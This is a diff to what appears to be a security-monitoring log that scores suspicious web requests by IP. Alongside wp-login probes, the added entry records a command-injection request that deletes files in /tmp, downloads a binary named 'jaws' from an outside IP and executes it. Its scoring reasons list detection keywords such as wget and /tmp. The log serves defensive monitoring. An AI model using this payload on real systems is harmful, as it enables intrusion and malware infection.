@@ -154,3 +154,8 @@ IP: 172.71.203.97 | Level: CRITICAL 🚨 | Score: 100
 IP: 157.230.58.1 | Level: CRITICAL 🚨 | Score: 110
   Reason: PathMatch(wp-login):+60, PathMatch(.php):+40, SuspiciousStatus(404):+10
   RawLog: 157.230.58.1 - - [28/May/2026:01:16:02 +0000] "GET /wp-login.php HTTP/1.1" 404 4003 "-" "Mozilla/5.0" "157.230.58.1"
+
+--- Update 2026-05-28T02:22:17.041839 ---
+IP: 187.57.49.147 | Level: CRITICAL 🚨 | Score: 205
+  Reason: QueryMatch(wget):+80, QueryMatch(/tmp):+60, UAExactMatch:+50, SuspiciousStatus(400):+15
+  RawLog: 187.57.49.147 - - [28/May/2026:02:22:07 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1" 400 157 "-" "-" "-"
